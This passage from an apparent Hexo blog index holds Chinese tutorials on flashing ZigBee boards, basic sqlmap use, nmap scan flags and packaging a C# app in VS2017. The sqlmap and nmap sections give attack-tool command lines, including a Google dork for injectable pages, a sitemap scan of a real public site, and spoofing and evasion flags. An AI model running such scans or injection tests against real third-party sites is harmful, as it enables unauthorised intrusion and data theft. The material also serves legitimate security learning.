programmer这款软件</p><p><a href="https://pan.baidu.com/s/1TyV7qdPfyicisiA6sISpzg" target="_blank" rel="noopener">下载链接</a>，提取码：n4br</p><p>点击安装即可，安装完成后桌面会出现以下图标，点击即可打开应用</p><p><img src="D:%5CBlog%5Csource_posts%5CZigBee%E5%85%A5%E9%97%A8.assets%5Cimage-60.png" alt=""></p><p>另外需要在IAR中导出后缀为.Hex的文件</p><p>在输入框中输入你想命名的.Hex文件（注：格式为文件名+.hex）</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-62.png" style="zoom:50%;" /><p>另外在Output format处选择intel-extended，OK即可</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-63.png" style="zoom:50%;" /><p>随后编译，可看见在此目录下多了一个a.hex的文件</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-64.png" style="zoom:50%;" /><p>在 SmartRF flash programmer 软件的flash image中选择到此文件，点击perform action，即可将文件烧到板子里面去</p><img src="D:\Blog\source\_posts\ZigBee入门.assets\image-61.png" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap的基础使用</title>
      <link href="/2020/01/12/Sqlmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/01/12/Sqlmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>Sqlmap是开源的自动化SQL注入工具，有python写成，具有如下特点：</p><ul><li>完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。</li><li>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。</li><li>在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。</li><li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</li><li>支持自动识别密码哈希格式并通过字典破解密码哈希。</li><li>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</li><li>支持在数据库管理系统中搜索指定的数据库名、表名或列名</li><li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。</li><li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。</li></ul><p><img src="inner.png" alt="inner"></p><h1 id="安装sqlmap"><a href="#安装sqlmap" class="headerlink" title="安装sqlmap"></a>安装sqlmap</h1><p><img src="https://i.loli.net/2020/03/27/KMWalvmxL7PByRe.png" alt=""></p><p>命令行代码如下：</p><ul><li>git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a></li><li>cd sqlmap</li><li>ls</li><li>python sqlmap.py</li></ul><h1 id="输出级别"><a href="#输出级别" class="headerlink" title="输出级别"></a>输出级别</h1><p>———-参数：-v</p><p>sqlmap的输出信息按从简到繁分为7个级别，依次为0,1,2,3,4,5,6。</p><p>使用参数“-v &lt;级别&gt;”来指定某个等级，如使用参数“-v 6”来指定输出级别为6。默认输出级别为1.各个输出级别的描述如下：</p><ul><li>0：只显示Python的tracebacks信息，错误信息[ERROR]和关键信息[CRITICAL]；</li><li>1：同时显示普通信息[INFO]和警告信息[WARNING];</li><li>2：同时显示调时信息[DEBUG]；</li><li>3：同时显示注入使用的攻击荷载；</li><li>4：同时显示HTTP请求；</li><li>5：同时显示HTTP响应头；</li><li>6：同时显示HTTP响应体。</li></ul><h1 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h1><h2 id="直连连接数据库"><a href="#直连连接数据库" class="headerlink" title="直连连接数据库"></a><strong>直连连接数据库</strong></h2><p>———-参数 ：-d</p><p>使用参数“-d”直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式：</p><p>（1）当数据库管理系统是MySQL，Oracle，Mircrosoft SQL Server 或PostgreSQL等格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</span><br></pre></td></tr></table></figure><p>（2）当数据库管理系统是SQLite，Mircrosoft Access或Firebird等格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS://DATABASE_FILEPATH</span><br></pre></td></tr></table></figure><p>需安装Python连接MySQL用的第三方库python-pymysql。</p><p>命令如下：</p><ul><li>git clone <a href="https://github.com/petehunt/PyMySQL" target="_blank" rel="noopener">https://github.com/petehunt/PyMySQL</a></li><li>cd PyMySQL</li><li>sudo python setup.py install</li></ul><h2 id="指定目标URL"><a href="#指定目标URL" class="headerlink" title="指定目标URL"></a><strong>指定目标URL</strong></h2><p>———-参数：-u 或 -url</p><p>使用参数“-u”或“-url”指定一个URL作为目标，该参数后跟一个表示URL的字符串，可以是http协议也可以是https协议，还可以指定端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://127.0.0.1:8080/index.php?id=1"</span><br></pre></td></tr></table></figure><h2 id="从代理日志中解析目标"><a href="#从代理日志中解析目标" class="headerlink" title="从代理日志中解析目标"></a><strong>从代理日志中解析目标</strong></h2><p>———-参数：-l</p><p>BP或者webscarab的代理日志文件，sqlmap将从日志中解析出可能的攻击目标，并逐个尝试进行注入，该参数后跟一个表示日志的路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -l ../1.log</span><br></pre></td></tr></table></figure><p>手动开启BP记录日志功能：</p><img src="https://i.loli.net/2020/03/27/93u2DaJsmFOZMpX.png" style="zoom:67%;" /><p>注意日志文件的路径要写正确。执行该命令时，每找到一个可能的攻击目，Sqlmap都会询问是否要检测该目标。，默认回答为“Y”，想要测试该目标，直接按回车键就行。另外可以用-scope过滤日志</p><h2 id="从站点地图文件中解析目标"><a href="#从站点地图文件中解析目标" class="headerlink" title="从站点地图文件中解析目标"></a><strong>从站点地图文件中解析目标</strong></h2><p>———-参数：-x</p><p>为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图，如百度Sitemap支持xml格式。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测，此时使用的参数是“-x”，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -x https://www.bilibili.com/sitemap.xml</span><br></pre></td></tr></table></figure><p>若执行结果为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[WARNING] no usable links found (with GET parameters)</span><br></pre></td></tr></table></figure><p>没有找到有GET参数的可用链接。站点地图中的URL很少包含GET参数，POST参数就更不用说了</p><h2 id="从文本文件中解析目标"><a href="#从文本文件中解析目标" class="headerlink" title="从文本文件中解析目标"></a><strong>从文本文件中解析目标</strong></h2><p>———-参数：-m</p><p>参数“-u”一次只能指定一个URL，若有多个URL需要测试就显得很不方便，我们可用将多个URL以一行一个的格式保存在文本文件中，然后使用参数“-m”，后跟该文本文件路径，让Sqlmap依次读取文件中的URL作为攻击目标</p><p>执行命令行格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m url.txt</span><br></pre></td></tr></table></figure><h2 id="从文件载入HTTP请求"><a href="#从文件载入HTTP请求" class="headerlink" title="从文件载入HTTP请求"></a><strong>从文件载入HTTP请求</strong></h2><p>———-参数：-r</p><p>可以将一个HTTP请求保存在文件中，然后使用参数“-r”加载该文件，Sqlmap会解析该文件，从该文件分析目标并进行测试。</p><p>即可将BP抓下来的数据复制到文本当中：</p><img src="https://i.loli.net/2020/03/27/kiA9mzSU52INBgx.png" style="zoom:67%;" /><p>则使用如下命令让Sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r get.txt</span><br></pre></td></tr></table></figure><h2 id="将Google搜索结果作为攻击目标"><a href="#将Google搜索结果作为攻击目标" class="headerlink" title="将Google搜索结果作为攻击目标"></a><strong>将Google搜索结果作为攻击目标</strong></h2><p>———-参数：-g</p><p>Sqlmap能自动获取Google搜索的前一百个结果，对其中有GET参数的URL进行注入测试。当然，所处的网络环境要能访问Google才行。下面是Sqlmap手册中“-g”参数的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -g "inurl:\".php?id=1\""</span><br></pre></td></tr></table></figure><h2 id="从配置文件中载入攻击目标"><a href="#从配置文件中载入攻击目标" class="headerlink" title="从配置文件中载入攻击目标"></a><strong>从配置文件中载入攻击目标</strong></h2><p>———-参数：-c</p><p>使用参数“-c”指定一个配置文件（如：sqlmap.conf），Sqlmap会解析该配置文件，按照该配置文件的配置执行动作。配置文件中可以指定攻击目标，实际上除了攻击目标外，配置文件还可以指定各种参数的值。</p><h1 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h1><p>HTTP是一个复杂的协议。HTTP请求有很多种方法（method），可以在不同位置（GET、POST、cookie和User-Agent等）携带不同参数。往往只有在特定位置携带了特定参数以特定方法发起的请求才是合法有效的请求。Sqlmap运行时除了需要指定目标，有时还需要指定HTTP请求的一些细节。下面这些参数都用于指定HTTP请求细节。</p><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a><strong>HTTP方法</strong></h2><p>———-参数：-method</p><p>一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“–method”来指定方法。如：“–method=PUT”。</p><h2 id="POST参数"><a href="#POST参数" class="headerlink" title="POST参数"></a><strong>POST参数</strong></h2><p>———-参数：-data</p><p>该参数指定的数据会被作为POST数据提交，Sqlmap也会检测该参数指定数据是否存在注入漏洞。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://192.168.56.102:8080/user.php" --data="id=0&amp;name=werner"</span><br></pre></td></tr></table></figure><h2 id="指定分隔符"><a href="#指定分隔符" class="headerlink" title="指定分隔符"></a><strong>指定分隔符</strong></h2><p>———-参数：–param-del</p><p>上一个例子中“–data”的数据“id=0&amp;name=werner”其实由两个部分组成：“id=0”和“name=werner”，默认地以“&amp;”作为分隔符。我们可以使用“–param-del”来指定分隔符，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://192.168.56.102:8080/user.php" --data="id=0;name=werner" --param-del=";"</span><br></pre></td></tr></table></figure><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a><strong>cookie</strong></h2><p>———-参数： –cookie、–cookie-del、–drop-set-cookie和–load-cookies</p><p>有两种情况会用到这些参数：</p><ul><li>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别</li><li>想要检测是否存在cookie注入</li></ul><p>当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞，关于“–level”的更多信息见下文。</p><p>“–cookie”和“–cookie-del”</p><p>在浏览器中登录目标网站后复制出维持登录状态的cookie，用参数“–cookie”来指定这些cookie，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://127.0.0.1:8080/user.php" --cookie "JSESSIONID=E5D6C8C81;NAME=werner;"</span><br></pre></td></tr></table></figure><p>与POST参数不同，cookie默认的分隔符为“;”，想要指定cookie中的分隔符，使用参数“–cookie-del”。</p><p>“–drop-set-cookie”</p><p>若HTTP响应头中有“Set-Cookie”，Sqlmap会自动设置“Set-Cookie”设置的cookie，并对这些cookie进行检测。若不想让Sqlmap这么做，添加参数“–drop-set-cookie”即可，这样，Sqlmap会忽略“Set-Cookie”。</p><p>“–load-cookies”</p><p>该参数用于从文件中载入Netscape或wget格式的cookie。</p><h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a><strong>User-Agent</strong></h2><p>———-参数： –user-agent和–random-agent</p><p>默认情况下Sqlmap发送的HTTP请求中的User-Agent值为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure><p>使用参数“–user-agent”可以指定一个User-Agent值。但正常的User-Agent值长什么样我们可能并不记得，所以有了参数“–random-agent”，使用该参数，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent。注意，在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent。</p><p>用如下命令统计user-agents.txt行数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sqlmap/txt/user-agents.txt | wc -l</span><br></pre></td></tr></table></figure><p>结果为4211，当然其中还包含空行、注释等，但总的来说该文件中存储的User-Agent也有4千多个。当“–level”设置为3或更高时，Sqlmap会检测User-Agent是否存在注入漏洞</p><h2 id="Host"><a href="#Host" class="headerlink" title="Host"></a><strong>Host</strong></h2><p>———-参数：-host</p><p>使用该参数可以手动指定HTTP头中的Host值。</p><p>当“–level”设置为5或更高时，Sqlmap会检测Host是否存在注入漏洞</p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a><strong>Referer</strong></h2><p>———-参数：-referer</p><p>使用该参数可以指定HTTP头中的Referer值。Sqlmap发送的HTTP请求头部默认无Referer字段。</p><p>当“–level”设置为3或更高时，Sqlmap会检测Referer是否存在注入漏洞，关于“–level”的更多信息见下文。</p><h2 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a><strong>额外的HTTP头</strong></h2><p>———-参数：-headers</p><p>使用该参数可以在Sqlmap发送的HTTP请求报文头部添加字段，若添加多个字段，用“\n”分隔。如命令：</p><p>python sqlmap.py -u “<a href="http://192.168.56.101:8080/&quot;" target="_blank" rel="noopener">http://192.168.56.101:8080/&quot;</a> -v 5 –headers “X-A:A\nX-B: B”</p><p>发送的HTTP请求包为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">X-B: B</span><br><span class="line">Host: 192.168.56.101:8080</span><br><span class="line">Accept-encoding: gzip,deflate</span><br><span class="line">X-A: A</span><br><span class="line">Accept: */*</span><br><span class="line">User-agent: sqlmap/1.1.10#stable (http://sqlmap.org)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>加参数“-v 5”是为了让Sqlamp输出发送的HTTP请求包，便于我们观察。</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a><strong>身份认证</strong></h2><p>———-参数： –auth-type和–auth-cred</p><p>这些参数用于进行身份认证。“–auth-type”用于指定认证方式，支持以下三种身份认证方式：</p><ul><li>Basic</li><li>Digest</li><li>NTLM</li></ul><p>“–auth-cred”用于给出身份认证的凭证，格式是“username:password”。如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"</span><br></pre></td></tr></table></figure><h2 id="基于证书的身份认证"><a href="#基于证书的身份认证" class="headerlink" title="基于证书的身份认证"></a><strong>基于证书的身份认证</strong></h2><p>———-参数： –auth-file</p><p>若Web服务器要求客户端提供证书则可以使用此参数指定一个PEM格式的证书文件。我们知道SSL协议的客户端认证是可选的，实践中一般都只用服务器端提供自己的证书供客户端验证，很少要求客户端提供自己的证书。</p><h2 id="忽略401"><a href="#忽略401" class="headerlink" title="忽略401"></a><strong>忽略401</strong></h2><p>———-参数： –ignore-401</p><p>使用该参数忽略401错误（未认证）。</p><p><strong>HTTP(S)代理</strong></p><p>———-参数： –proxy、–proxy-cred、–proxy-file和–ignore-proxy</p><p>使用参数“–proxy”来设置一个HTTP(S)代理，格式是“http(s)://url:port”。若代理需要认证，使用参数“–proxy-cred”来提供认证凭证，格式是“username:password”。</p><p>使用参数“–proxy-file”指定一个存储着代理列表的文件，Sqlmap会依次使用文件中的代理，当某个代理有任何连接问题时就会被弃用而换下一个代理。</p><p>使用参数“–ignore-proxy”忽略本地代理设置。</p><h2 id="Tor匿名网络"><a href="#Tor匿名网络" class="headerlink" title="Tor匿名网络"></a><strong>Tor匿名网络</strong></h2><p>———-参数： –tor、–tor-type、–tor-port和–check-tor</p><p>不管出于什么原因，如果想要保持匿名状态与其使用单个的HTTP(S)代理，不如安装类似Privoxy这样的软件按照Tor的安装指导配置一个Tor客户端。设置好后使用参数“–tor”让Sqlmap自动设置使用Tor代理。</p><p>如果想要手动指定Tor的类型和端口可以使用参数“–tor-type”和“–tor-port”，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tor-type=SOCKS5 --tor-port 9050</span><br></pre></td></tr></table></figure><p>如果要求高度的匿名性可以使用参数“–check-tor”，加上该参数后Sqlmap会确保所有流量都走Tor代理，若Tor代理失效，Sqlmap会发出警告并退出。检测方法是访问Are you using Tor?。</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap的基础使用</title>
      <link href="/2020/01/12/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/01/12/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>nmap这个渗透工具一般有在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持</p><p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnmap。</p><p>Nmap可以完成以下任务：</p><ul><li>主机探测</li><li>端口扫描</li><li>版本检测</li><li>系统检测</li><li>支持探测脚本的编写</li></ul><p>Nmap在实际中应用场合如下：</p><ul><li>通过对设备或者防火墙的探测来审计它的安全性</li><li>探测目标主机所开放的端口</li><li>通过识别新的服务器审计网络的安全性</li><li>探测网络上的主机</li></ul><p>常见服务对应端口号：</p><table><thead><tr><th align="center"><strong>服务</strong></th><th align="center"><strong>端口号</strong></th></tr></thead><tbody><tr><td align="center">HTTP</td><td align="center">80</td></tr><tr><td align="center">HTTPS</td><td align="center">443</td></tr><tr><td align="center">Telnet（远程登录）</td><td align="center">23</td></tr><tr><td align="center">SSH（安全登录），SCP（文件传输），端口重定向</td><td align="center">22</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/SMTP/175887?fr=aladdin" target="_blank" rel="noopener">SMTP</a>（简单邮件传输协议）</td><td align="center">25</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/POP3/175122?fr=aladdin" target="_blank" rel="noopener">POP3</a>（ 邮局协议版本3 ）</td><td align="center">110</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/weblogic/451978?fr=aladdin" target="_blank" rel="noopener">WebLogic</a></td><td align="center">7001</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/tomcat/255751?fr=aladdin" target="_blank" rel="noopener">TOMCAT</a>（ Java Web服务器 ）</td><td align="center">8080</td></tr><tr><td align="center">WIN2003远程登录</td><td align="center">3389</td></tr><tr><td align="center">Oracle数据库</td><td align="center">1521</td></tr><tr><td align="center">MY SQL SERVER数据库</td><td align="center">1433</td></tr><tr><td align="center">MySQL数据库</td><td align="center">3306</td></tr></tbody></table><p>在kali中使用：命令行nmap即可使用</p><p>nmap -version即可查看nmap的版本信息</p><p><img src="https://i.loli.net/2020/03/27/LnOsjd6PfuStewI.png" alt=""></p><p>扫描简单来说就是四个动作</p><ul><li>统一沟通语言（TCP/IP协议）</li><li>发出刺激（ICMP报文头）</li><li>受到刺激的反馈（ICMP的反馈）</li><li>通过比对刺激和反馈完成扫描</li></ul><p>说实话这四个动作具体是啥意思我也不是很明白</p><p>将你要扫描的设备地址告诉nmap可以通过下面的方法实现统一的格式</p><ul><li>namp [扫描类型] [设置] {设备地址}</li></ul><p><strong>nmap常用的参数及意义</strong></p><ol><li>-A ：选择用于使用进攻性方式扫描；全面系统检测，启用脚本检测，扫描。（推荐）</li><li>-T4：指定扫描过程使用的时序，表示禁止动态扫描延时超过的时间；总共有6个级别（0-5）。级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4 。*（ 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 ）（推荐）</li><li>-oX test.xml：将扫描结果生成test.xml文件</li><li>-oG test.txt：将扫描结果生成test.txt文件</li><li>-sn：只进行主机发现，不进行端口扫描</li><li>-O：指定Nmap进行系统版本扫描</li><li>-sV：指定Nmap进行服务版本扫描</li><li>-p <code>&lt;port ranges&gt;</code>：扫描指定的端口</li><li>-sS/sT/sA/sW/sM：指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描</li><li>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况</li><li>-script  <code>&lt;script name&gt;</code> : 指定扫描脚本</li><li>-Pn ： 不进行ping扫描（推荐）</li><li>-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping</li><li>-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。</li><li>-iL 1.txt : 批量扫描1.txt中的目标地址</li><li>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现</li><li>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况</li><li>-sO: 使用IP protocol 扫描确定目标机支持的协议类型</li><li>-PO : 使用IP协议包探测对方主机是否开启</li><li>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机</li><li>-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现</li><li>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态</li><li>-e eth0：指定使用eth0网卡进行探测</li><li>-f : –mtu <code>&lt;val&gt;</code>: 指定使用分片、指定数据包的 MTU.</li><li>-b <code>&lt;FTP relay host&gt;</code>: 使用FTP bounce scan扫描方式</li><li>-g： 指定发送的端口号</li><li>-r：不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）</li><li>-v ：表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态（推荐）</li><li>-n : 表示不进行DNS解析；</li><li>-D &lt;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址</li><li>-R ：表示总是进行DNS解析。</li><li>-F : 快速模式，仅扫描TOP 100的端口</li><li>-S <IP_Address>: 伪装成其他 IP 地址</li><li>–ttl <code>&lt;val&gt;</code>: 设置 time-to-live 时间</li><li>–badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）</li><li>–dns-servers : 指定DNS服务器</li><li>–system-dns : 指定使用系统的DNS服务器</li><li>–traceroute : 追踪每个路由节点</li><li>–scanflags <code>&lt;flags&gt;</code>: 定制TCP包的flags</li><li>–top-ports <code>&lt;number&gt;</code> :扫描开放概率最高的number个端口</li><li>–port-ratio <code>&lt;ratio&gt;</code>: 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数</li><li>–version-trace: 显示出详细的版本侦测过程信息</li><li>–osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）</li><li>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统</li><li>–data-length <code>&lt;num&gt;</code>: 填充随机数据让数据包长度达到 Num</li><li>–ip-options <code>&lt;options&gt;</code>: 使用指定的 IP 选项来发送数据包</li><li>–spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址</li><li>–version-intensity <code>&lt;level&gt;</code>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li><li>–version-light: 指定使用轻量侦测方式 (intensity 2)</li><li>–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</li></ol><p><img src="https://i.loli.net/2020/03/27/PV3d5LBakieFRSy.png" alt=""></p><p>参考原文链接：<a href="https://www.cnblogs.com/bonelee/p/9188122.html" target="_blank" rel="noopener">1</a>，<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html" target="_blank" rel="noopener">2</a></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VS2017中将C#Windows窗体应用打包成msi或者exe</title>
      <link href="/2020/01/10/VS2017%E4%B8%AD%E5%B0%86C-Windows%E7%AA%97%E4%BD%93%E5%BA%94%E7%94%A8%E6%89%93%E5%8C%85%E6%88%90msi%E6%88%96%E8%80%85exe/"/>
      <url>/2020/01/10/VS2017%E4%B8%AD%E5%B0%86C-Windows%E7%AA%97%E4%BD%93%E5%BA%94%E7%94%A8%E6%89%93%E5%8C%85%E6%88%90msi%E6%88%96%E8%80%85exe/</url>
      
        <content type="html"><![CDATA[<ul><li>打开vs2017 ，选择 工具 –&gt; 扩展和更新 –&gt; 联机，搜索Microsoft Visual Studio 2017 Installer Projects，进行安装。安装好以后，重启vs2017</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image.png" style="zoom:50%;" /><ul><li>在解决方案中，右击项目 –&gt; 添加 –&gt; 新建项目，命名xxxSetup（本程序是WindowsSetup）之后点击确定。</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-2.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-3.png" style="zoom:50%;" /><ul><li>确认后的窗口应该是这样的</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-4.png" style="zoom:50%;" /><ul><li>添加入口文件（就是main方法）：选择 Application Folder 右键–&gt; Add –&gt; 项目输出 </li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-5.png" style="zoom:50%;" /><ul><li>在弹出的窗口中：选择你的项目，指定为主输出，确定</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-5.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-7.png" style="zoom:50%;" /><p>确定后界面  </p><ul><li>添加图标：右边框中右键–&gt;Add–&gt;文件，选择ico图标添加即可，这里给一个在线png/jpg转ico文件的网址<a href="https://www.easyicon.net/covert/" target="_blank" rel="noopener">https://www.easyicon.net/covert/</a></li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-8.png" style="zoom:50%;" /><ul><li>右击主输出 –&gt; Create Shortcut To xxx，并重名命名为WindowsForms (Active)</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-9.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-10.png" style="zoom:50%;" /><p>完成后界面</p><ul><li>将快捷方式拖到 User’s Desktop，设置快捷方式的图标</li></ul><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-12.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-14.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-15.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-15.png" style="zoom:50%;" /><img src="D:\Blog\source\_posts\VS2017中将C-Windows窗体应用打包成msi或者exe.assets\image-17.png" style="zoom:50%;" /><ul><li><p>点OK，点击OK，添加桌面快捷方式的图标完成</p></li><li><p>在User’s Programs Menu 添加文件夹（自己的项目名） –&gt; 双击选中自己的项目名文件夹 –&gt;在右边右击–&gt; 创建新的快捷方式 –&gt; 选择Applicaiton Folder –&gt; 主输出 XXX –&gt; 确定</p></li></ul><img 